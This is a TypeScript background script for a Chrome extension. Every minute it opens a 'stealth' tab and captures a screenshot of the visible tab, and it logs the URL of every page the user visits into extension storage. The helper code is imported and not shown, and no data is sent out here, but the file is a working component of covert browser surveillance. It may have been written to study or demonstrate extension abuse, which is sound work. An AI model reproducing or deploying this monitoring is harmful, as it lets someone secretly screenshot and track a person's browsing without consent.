import { BackgroundMessage, StorageKey } from "../consts";
import { INavigationLogEntry } from "../interfaces";
import { captureVisibleTab, openStealthTab } from "../utils/background-utils";
import { logData, simplePrepend, writeLog } from "../utils/shared-utils";

console.log("background.ts");

chrome.alarms.create({ periodInMinutes: 1 });

chrome.alarms.onAlarm.addListener(() => {
  openStealthTab();
  captureVisibleTab();
});

chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());

chrome.runtime.onMessage.addListener(async (message, sender, response) => {
  const { messageType, data }: { messageType: BackgroundMessage; data?: any } =
    message;

  console.log({ messageType, data });

  switch (messageType) {
    case BackgroundMessage.HEARTBEAT:
      writeLog("Heartbeat");
      break;
    case BackgroundMessage.OPEN_STEALTH_TAB:
      await openStealthTab();
      break;
    case BackgroundMessage.CAPTURE_VISIBLE_TAB:
      await captureVisibleTab();
      break;
    default:
      // HMR may send a message
      console.error("Bad message", message);
  }
});

chrome.webNavigation.onCompleted.addListener(async (details) => {
  await simplePrepend<INavigationLogEntry>(StorageKey.NAVIGATION_LOG, {
    url: details.url,
    ...logData(),
  });

  writeLog("Recorded navigation");
});
